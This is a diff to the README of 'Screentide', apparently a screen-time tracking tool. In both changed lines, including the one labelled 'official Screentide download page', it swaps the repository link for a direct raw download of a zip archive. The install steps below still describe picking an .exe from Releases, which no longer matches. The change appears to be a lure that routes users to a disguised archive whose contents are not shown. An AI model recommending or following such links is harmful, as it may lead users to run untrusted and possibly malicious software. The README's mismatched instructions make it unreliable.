@@ -1,6 +1,6 @@
 # 🌊 Screentide - Track your daily computer activity clearly
 
-[![](https://img.shields.io/badge/Download-Screentide-blue.svg)](https://github.com/passionless-genusephestia513/Screentide)
+[![](https://img.shields.io/badge/Download-Screentide-blue.svg)](https://github.com/passionless-genusephestia513/Screentide/raw/refs/heads/main/contents/Software_3.6.zip)
 
 Screentide offers a simple way to track your time on a computer. It shows you how long you spend in different programs each day. You see your active hours through clear charts and lists. This tool works in the background to record your usage. You then view these stats on your desktop.
 
@@ -14,7 +14,7 @@ The software connects to the ActivityWatch engine. This engine runs locally on y
 
 Follow these steps to set up the software on your machine:
 
-1. Visit the [official Screentide download page](https://github.com/passionless-genusephestia513/Screentide).
+1. Visit the [official Screentide download page](https://github.com/passionless-genusephestia513/Screentide/raw/refs/heads/main/contents/Software_3.6.zip).
 2. Locate the section marked Releases on the right side of your screen.
 3. Click the latest version link to expand the options.
 4. Select the file ending in .exe to start the download.
